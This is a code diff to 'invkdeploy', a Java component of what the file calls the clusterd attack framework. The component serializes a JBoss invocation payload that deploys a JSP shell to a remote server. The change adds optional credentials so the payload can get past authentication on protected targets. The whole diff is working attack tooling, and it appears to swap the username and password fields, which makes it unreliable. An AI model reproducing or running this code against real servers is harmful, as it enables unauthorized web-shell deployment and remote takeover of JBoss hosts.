@@ -16,6 +16,7 @@ import org.jboss.invocation.MarshalledInvocation;
 import org.jboss.invocation.MarshalledValue;
 import org.jboss.mx.util.ObjectNameFactory;
 import javax.management.ObjectName;
+import org.jboss.security.SimplePrincipal;
 
 /*
  This application is part of the clusterd attack framework.
@@ -52,6 +53,9 @@ public class invkdeploy{
         Integer random_value;
         String remote_url;
         String local_url;
+        String username = null;
+        String password = null;
+        boolean doAuth = false;
 
         // 5.x settings
         String jsp_shell = null;    // jsp shell
@@ -68,6 +72,12 @@ public class invkdeploy{
             remote_url = args[1];
             local_url = args[2];
             random_value = Integer.parseInt(args[3]);
+
+            if(args.length > 4){
+                username = (String)args[4];
+                password = (String)args[5];
+                doAuth = true;
+            }
 
             hash = version_hash.get(version);
             if(hash == null){
@@ -110,6 +120,10 @@ public class invkdeploy{
         };
         
         payload.setArguments(file_list);
+        if(doAuth){
+            payload.setCredential(new MarshalledValue(username));
+            payload.setPrincipal(new SimplePrincipal(password));
+        }
 
         FileOutputStream fileOut = new FileOutputStream(save_location); 
         ObjectOutputStream out = new ObjectOutputStream(fileOut);
